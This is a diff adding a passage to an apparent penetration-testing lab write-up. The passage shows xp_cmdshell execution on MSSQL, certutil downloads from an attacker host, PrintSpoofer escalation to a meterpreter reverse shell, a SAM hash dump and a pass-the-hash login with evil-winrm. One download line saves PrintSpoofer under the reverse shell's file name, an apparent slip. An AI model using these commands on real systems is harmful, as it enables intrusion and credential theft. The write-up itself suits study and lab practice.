@@ -233,3 +233,58 @@ To connect to the database, we need to use the tool `mssqlclient` from impacket.
 ```
 impacket-mssqlclient netdb@172.16.7.60
 ```
+
+After, having access to the database, we can enumerate the privileges of the account:
+
+```
+xp_cmdshell whoami /priv
+```
+
+And we discover that this is enabled:
+
+```
+Privilege Name                Description                               State      
+
+============================= ========================================= ========
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+```
+
+After a little bit of searching, we find the possibility to use **PrintSpoofer** to elevate privileges.
+
+To do that, we download the files to the windows machine from the attacker machine:
+
+```
+xp_cmdshell "certutil -urlcache -f http://172.16.7.240:8000/PrintSpoofer64.exe C:\Users\Public\PrintSpoofer64.exe"
+xp_cmdshell "certutil -urlcache -f http://172.16.7.240:8000/PrintSpoofer64.exe C:\Users\Public\rshell.exe"
+```
+
+And execute the reverse shell with a listener on metasploit.
+
+```
+xp_cmdshell C:\Users\Public\PrintSpoofer64.exe -c "C:\Users\Public\rshell.exe"
+```
+
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+And now we can submit the content of the flag.&#x20;
+
+And also, use the meterpreter capabilities to dump the contents of the SAM database
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+```
+
+### Access to MS01
+
+We try a pass the hash attack et voilà, ça marche.
+
+```
+evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+ms01\administrato
+```
+
